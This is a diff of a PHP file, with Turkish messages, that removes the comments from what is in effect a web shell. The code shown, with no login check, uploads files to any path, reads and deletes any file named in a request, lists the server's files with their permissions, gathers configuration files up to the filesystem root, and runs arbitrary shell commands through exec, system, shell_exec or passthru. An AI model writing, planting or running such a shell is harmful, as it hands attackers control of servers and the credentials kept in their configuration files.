@@ -1,11 +1,8 @@
 <?php
 
 
-// İşlem sonucunu göstermek için bir mesaj değişkeni
 $message = '';
-//$uploadDir = 'uploads/';
 
-// Dosya yükleme işlemi
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
     $uploadDir = $_POST['location'];
     $targetFile = $uploadDir . basename($_FILES['fileToUpload']['name']);
@@ -14,12 +11,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
     } else {
         $message = "Dosya yükleme başarısız oldu.";
     }
-    // Sayfa yenilemesine karşı yönlendirme
+    
     header("Location: " . $_SERVER['PHP_SELF'] . "?message=" . urlencode($message));
     exit;
 }
 
-// Dosya silme işlemi
+
 if (isset($_POST['delfile'])) {
     $fileToDelete = $_POST['delfile'];
     if (file_exists($fileToDelete)) {
@@ -28,32 +25,32 @@ if (isset($_POST['delfile'])) {
     } else {
         $message = "Silinecek dosya bulunamadı.";
     }
-    // Sayfa yenilemesine karşı yönlendirme
+    
     header("Location: " . $_SERVER['PHP_SELF'] . "?message=" . urlencode($message));
     exit;
 }
 
 
 
-// Kullanıcıya gösterilecek mesaj
+
 if (isset($_GET['message'])) {
     $message = htmlspecialchars($_GET['message']);
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dosya_yolu'])) {
-    $dosyaYolu = $_POST['dosya_yolu']; // Formdan gelen dosya yolu
+    $dosyaYolu = $_POST['dosya_yolu']; 
 
-    // Dosya mevcut mu ve okunabilir mi kontrol et
+
     if (file_exists($dosyaYolu) && is_readable($dosyaYolu)) {
-        // Dosya içeriğini oku
+   
         $icerik = file_get_contents($dosyaYolu);
 
-        // İçeriği raw olarak göster
-        header('Content-Type: text/plain'); // İçeriği düz metin olarak tanımla
+      
+        header('Content-Type: text/plain'); 
         echo $icerik;
-        exit; // Burada dur, çünkü aşağıdaki HTML kodunu göstermemek istiyoruz
+        exit;
     } else {
-        // Hata mesajı
+    
         echo "<p style='color: red;'>Dosya bulunamadı veya okunamıyor: $dosyaYolu</p>";
     }
 }
@@ -62,12 +59,11 @@ function listFilesAndDirectories($directory)
 {
     $dosyalar = [];
 
-    // Dizin okunabilir mi kontrol et
     if (!is_readable($directory)) {
         return [];
     }
 
-    // Dizin içeriğini al
+    
     $items = scandir($directory);
     if ($items === false) {
         return [];
@@ -77,13 +73,13 @@ function listFilesAndDirectories($directory)
         if ($item !== '.' && $item !== '..') {
             $path = $directory . DIRECTORY_SEPARATOR . $item;
 
-            // Dosya veya klasör olduğunu belirle
+            
             if (is_dir($path)) {
-                // Alt dizinlerde de arama yap ve sonucu ekle
+                
                 $altDosyalar = listFilesAndDirectories($path);
                 $dosyalar = array_merge($dosyalar, $altDosyalar);
             } else {
-                // Dosya izinlerini al
+                
                 $permissions = fileperms($path);
                 $formattedPermissions = substr(sprintf('%o', $permissions), -4);
                 $dosyalar[] = [$path, $directory, $formattedPermissions, $item];
@@ -94,8 +90,8 @@ function listFilesAndDirectories($directory)
     return $dosyalar;
 }
 
-// Kök dizinden başlat
-$rootDirectory =  $_SERVER['DOCUMENT_ROOT']; // Kök dizin
+
+$rootDirectory =  $_SERVER['DOCUMENT_ROOT']; 
 function listConfigFilesReverse($startDir, $extensions = ['conf', 'ini', 'yaml', 'yml', 'json', 'xml'])
 {
     $configFiles = [];
@@ -103,7 +99,7 @@ function listConfigFilesReverse($startDir, $extensions = ['conf', 'ini', 'yaml',
 
     while ($currentDir) {
         try {
-            // Mevcut dizindeki dosyaları tara
+          
             $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($currentDir));
 
             foreach ($iterator as $file) {
@@ -123,10 +119,10 @@ function listConfigFilesReverse($startDir, $extensions = ['conf', 'ini', 'yaml',
             echo "Dizin atlandı: " . $currentDir . " - Hata: " . $e->getMessage() . PHP_EOL;
         }
 
-        // Bir üst dizine geç
+    
         $currentDir = dirname($currentDir);
 
-        // Kök dizine ulaştıysa dur
+  
         if ($currentDir === '/' || $currentDir === realpath(getenv('SystemDrive') . '\\')) {
             break;
         }
@@ -135,8 +131,8 @@ function listConfigFilesReverse($startDir, $extensions = ['conf', 'ini', 'yaml',
     return $configFiles;
 }
 
-// Bulunduğunuz dosyanın dizininden başlayın
-$startDir = __DIR__; // Bu PHP dosyasının bulunduğu dizin
+
+$startDir = __DIR__; 
 
 
 function runCommand($command, $method = 'exec')
@@ -146,22 +142,22 @@ function runCommand($command, $method = 'exec')
 
     switch ($method) {
         case 'exec':
-            // exec fonksiyonu ile komut çalıştır
+           
             exec($command, $output, $return_var);
             break;
 
         case 'shell_exec':
-            // shell_exec fonksiyonu ile komut çalıştır
+       
             $output = shell_exec($command);
             break;
 
         case 'system':
-            // system fonksiyonu ile komut çalıştır
+           
             $output = system($command, $return_var);
             break;
 
         case 'passthru':
-            // passthru fonksiyonu ile komut çalıştır (ham çıktı)
+           
             passthru($command, $return_var);
             break;
 
@@ -169,7 +165,7 @@ function runCommand($command, $method = 'exec')
             throw new Exception("Geçersiz yöntem: $method");
     }
 
-    // Çıktıyı döndür
+
     return [
         'output' => $output,
         'return_var' => $return_var
@@ -237,46 +233,42 @@ if (isset($_POST["runmode"]) && isset($_POST["command"]))
             border-color: darkmagenta !important;
         }
 
-        /* DataTable Accent Rengi */
+        
         .table-striped tbody tr:nth-child(odd) {
             background-color: #f1f1f1;
-            /* Alternatif satır rengini değiştirir */
+          
         }
 
         .table-hover tbody tr:hover {
             background-color: #e0e0e0;
-            /* Hover (fare üzerine gelme) rengini değiştirir */
+
         }
 
         .table th {
             background-color: darkmagenta;
-            /* Başlık rengini değiştirir */
             color: white;
-            /* Başlık yazı rengini beyaz yapar */
+           
         }
 
         .dataTables_wrapper .dataTables_paginate .paginate_button {
             background-color: darkmagenta;
-            /* Sayfalama buton rengini değiştirir */
             color: white;
         }
 
         .dataTables_wrapper .dataTables_paginate .paginate_button:hover {
             background-color: darkmagenta;
-            /* Sayfalama butonunun hover rengini değiştirir */
+          
         }
 
-        /* Aktif sayfa (active) butonunun rengi */
         .paginate_button.page-item.active {
             background-color: darkmagenta !important;
-            /* Arka plan rengini darkmagenta yapar */
             border-color: darkmagenta !important;
-            /* Kenarlık rengini darkmagenta yapar */
+            
         }
 
         .paginate_button.page-item.active a {
             color: white !important;
-            /* Aktif butondaki yazıyı beyaz yapar */
+            
         }
 
         .form-control
@@ -325,7 +317,7 @@ if (isset($_POST["runmode"]) && isset($_POST["command"]))
                                 }
 
                                 if ($result) {
-                                    // Sonuçları ekrana yazdır
+                                  
                                     echo "<p style='color: #00bf00;'>Komut Çıktısı:\n";
                                     if ($_POST["runmode"] == "exec") {
                                         print_r($result["output"]) . "\n";
@@ -502,7 +494,7 @@ if (isset($_POST["runmode"]) && isset($_POST["command"]))
                                             <?php
 
 
-                                            // Konfigürasyon dosyalarını listele
+                                            
                                             $configFiles = listConfigFilesReverse($startDir);
 
 
@@ -548,7 +540,7 @@ if (isset($_POST["runmode"]) && isset($_POST["command"]))
     </div>
     <!-- End of Page Wrapper -->
     <script>
-        // JavaScript ile DataTable tanımlama
+      
         document.addEventListener("DOMContentLoaded", function () {
             $('#dataTable').DataTable();
             $('#dataTableconfig').DataTable();
